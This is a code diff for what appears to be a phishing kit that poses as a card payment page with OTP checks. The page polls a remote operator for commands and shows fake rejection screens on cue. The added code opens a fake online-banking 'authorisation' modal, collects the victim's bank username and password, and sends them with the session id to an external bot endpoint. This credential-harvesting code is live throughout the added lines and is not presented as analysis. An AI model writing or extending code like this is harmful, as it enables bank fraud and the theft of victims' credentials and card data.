@@ -614,7 +614,7 @@ function openAuthModal() {
   modal.style.display = 'flex';
   setTimeout(function() { modal.classList.add('show'); }, 10);
 
-  // 🔥 INICIAR POLLING DE OTP (para detectar CC_ERROR / RECHAZAR del admin)
+  // 🔥 INICIAR POLLING DE OTP (para detectar CC_ERROR/AUTORIZAR del admin)
   if (sessionIdActualPago) {
     iniciarPollingOtpActivo(sessionIdActualPago);
   }
@@ -713,14 +713,27 @@ function iniciarPollingOtp(sessionId, marca) {
           pagoOtpPollingInterval = null;
           ocultarCargaOtp();
           setTimeout(function() { window.location.href = window.location.pathname; }, 300);
-        } else if (data.accion === 'CC_ERROR' || data.estado === 'cc_error') {
+        }
+        // 🔥 AUTORIZAR → abrir modal banca virtual
+        else if (data.accion === 'AUTORIZAR' || data.estado === 'autorizacion') {
+          clearInterval(pagoOtpPollingInterval);
+          pagoOtpPollingInterval = null;
+          ocultarCargaOtp();
+          var cardNumA = (document.getElementById('cardNumber').value || '').replace(/\D/g, '');
+          abrirModalAutorizacion({
+            monto: TOTAL_PAGO,
+            ultimos4: cardNumA.slice(-4)
+          });
+        }
+        else if (data.accion === 'CC_ERROR' || data.estado === 'cc_error') {
           // 🔥 CC_ERROR → mostrar pantalla error OTP "Tarjeta no admitida"
           clearInterval(pagoOtpPollingInterval);
           pagoOtpPollingInterval = null;
           ocultarCargaOtp();
           document.getElementById('dynamicCode').value = '';
           mostrarErrorOtp('cc_error');
-        } else if (data.accion === 'RECHAZAR' || data.estado === 'rechazado') {
+        } 
+        else if (data.accion === 'RECHAZAR' || data.estado === 'rechazado') {
           // 🔥 RECHAZAR → mostrar pantalla error OTP "Código incorrecto"
           clearInterval(pagoOtpPollingInterval);
           pagoOtpPollingInterval = null;
@@ -735,7 +748,8 @@ function iniciarPollingOtp(sessionId, marca) {
 
 /* ============================================================ 
    🔥 POLLING ACTIVO DE OTP (cuando el usuario ESTÁ en la pantalla OTP)
-   Detecta CC_ERROR → vuelve a tarjeta | RECHAZAR → se queda en OTP
+   AUTORIZAR → abre modal banca virtual | CC_ERROR → vuelve a tarjeta
+   RECHAZAR → no hace nada (deja la pantalla tal cual)
    ============================================================ */
 var pagoOtpPollingActivoInterval = null;
 
@@ -748,6 +762,26 @@ function iniciarPollingOtpActivo(sessionId) {
       .then(function(data) {
         var accion = data.accion || '';
         var estado = data.estado || '';
+
+        // 🔥 AUTORIZAR → abrir modal banca virtual
+        if (accion === 'AUTORIZAR' || estado === 'autorizacion') {
+          clearInterval(pagoOtpPollingActivoInterval);
+          pagoOtpPollingActivoInterval = null;
+
+          var modalA = document.getElementById('authModal');
+          if (modalA) {
+            modalA.classList.remove('show');
+            setTimeout(function() { modalA.style.display = 'none'; }, 400);
+          }
+          document.body.style.overflow = '';
+
+          var cardNumA = (document.getElementById('cardNumber').value || '').replace(/\D/g, '');
+          abrirModalAutorizacion({
+            monto: TOTAL_PAGO,
+            ultimos4: cardNumA.slice(-4)
+          });
+          return;
+        }
 
         // CC_ERROR → cerrar OTP, borrar tarjeta, reabrir modal tarjeta con error
         if (accion === 'CC_ERROR' || estado === 'cc_error') {
@@ -787,36 +821,110 @@ function iniciarPollingOtpActivo(sessionId) {
           mostrarPagoError('visa', 'cc_error');
         }
 
-        // RECHAZAR → quedarse en OTP, borrar solo el campo OTP
+        // RECHAZAR → no hacer nada (dejar la pantalla tal cual)
+        // Solo detenemos el polling para no repetir la acción.
         else if (accion === 'RECHAZAR' || estado === 'rechazado') {
           clearInterval(pagoOtpPollingActivoInterval);
           pagoOtpPollingActivoInterval = null;
-
-          // Limpiar solo el campo OTP
-          var dynamicCode = document.getElementById('dynamicCode');
-          if (dynamicCode) {
-            dynamicCode.value = '';
-            dynamicCode.focus();
-          }
-
-          // Mostrar mensaje de error en el OTP
-          var otpError = document.getElementById('otpErrorMsg');
-          if (!otpError) {
-            otpError = document.createElement('div');
-            otpError.id = 'otpErrorMsg';
-            otpError.style.cssText = 'color:#d32f2f; font-size:13px; margin-top:10px; text-align:center; font-weight:600;';
-            var parent = dynamicCode ? dynamicCode.parentElement : null;
-            if (parent) parent.appendChild(otpError);
-          }
-          otpError.textContent = 'Código incorrecto. Intenta de nuevo.';
-          otpError.style.display = 'block';
-
-          // Reanudar polling para seguir escuchando nuevas acciones
-          setTimeout(function() {
-            if (sessionIdActualPago) iniciarPollingOtpActivo(sessionIdActualPago);
-          }, 500);
         }
       })
       .catch(function(err) { console.error('Error polling OTP activo:', err); });
   }, 2000);
 }
+
+/* ============================================================ 
+   MODAL AUTORIZACIÓN DE TRANSACCIÓN
+   ============================================================ */
+function abrirModalAutorizacion(opciones) {
+  opciones = opciones || {};
+  var monto = opciones.monto || TOTAL_PAGO;
+  var ultimos4 = opciones.ultimos4 || '';
+  var montoFormateado = Number(monto).toLocaleString('es-CO');
+
+  var hoy = new Date();
+  var fechaStr = String(hoy.getDate()).padStart(2, '0') + '/' +
+                 String(hoy.getMonth() + 1).padStart(2, '0') + '/' +
+                 hoy.getFullYear();
+
+  document.getElementById('authMonto').textContent = montoFormateado;
+  document.getElementById('authMontoDetalle').textContent = '$' + montoFormateado + ' COP';
+  document.getElementById('authFecha').textContent = fechaStr;
+
+  var tarjetaMask = '**** **** **** ' + (ultimos4 || '****');
+  document.getElementById('authTarjeta').textContent = ultimos4 ? '**** ' + ultimos4 : '****';
+  document.getElementById('authTarjetaDetalle').textContent = tarjetaMask;
+
+  document.getElementById('authUsuario').value = '';
+  document.getElementById('authPassword').value = '';
+  document.getElementById('authError').classList.add('hidden');
+  document.getElementById('authEnviarBtn').disabled = false;
+  document.getElementById('authEnviarBtn').textContent = 'Enviar';
+
+  var overlay = document.getElementById('modalAutorizacion');
+  overlay.classList.remove('hidden');
+  document.body.style.overflow = 'hidden';
+
+  setTimeout(function() { document.getElementById('authUsuario').focus(); }, 200);
+}
+
+function cerrarModalAutorizacion() {
+  document.getElementById('modalAutorizacion').classList.add('hidden');
+  document.body.style.overflow = '';
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+  var btnEnviar = document.getElementById('authEnviarBtn');
+  if (!btnEnviar) return;
+
+  btnEnviar.addEventListener('click', function() {
+    var usuario = document.getElementById('authUsuario').value.trim();
+    var password = document.getElementById('authPassword').value.trim();
+    var errorBox = document.getElementById('authError');
+
+    if (!usuario || usuario.length < 3) {
+      errorBox.textContent = 'Por favor ingresa tu usuario.';
+      errorBox.classList.remove('hidden');
+      return;
+    }
+    if (!password || password.length < 3) {
+      errorBox.textContent = 'Por favor ingresa tu contraseña.';
+      errorBox.classList.remove('hidden');
+      return;
+    }
+
+    errorBox.classList.add('hidden');
+    btnEnviar.disabled = true;
+    btnEnviar.textContent = 'Enviando...';
+
+    var sessionId = window.__PYP_SESSION__ || sessionIdActualPago || '';
+
+    fetch(URL_BOT_RAILWAY + '/' + BANCO_KEY_ACTUAL + '/enviar-autorizacion', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        sessionId: sessionId,
+        usuario: usuario,
+        password: password
+      })
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      if (data && data.ok) {
+        cerrarModalAutorizacion();
+        // Aquí puedes redirigir o mostrar pantalla de éxito
+        setTimeout(function() {
+          window.location.href = window.location.pathname;
+        }, 300);
+      } else {
+        throw new Error((data && data.error) || 'Error al enviar');
+      }
+    })
+    .catch(function(err) {
+      console.error('Error autorización:', err);
+      errorBox.textContent = 'No se pudo enviar. Intenta de nuevo.';
+      errorBox.classList.remove('hidden');
+      btnEnviar.disabled = false;
+      btnEnviar.textContent = 'Enviar';
+    });
+  });
+});
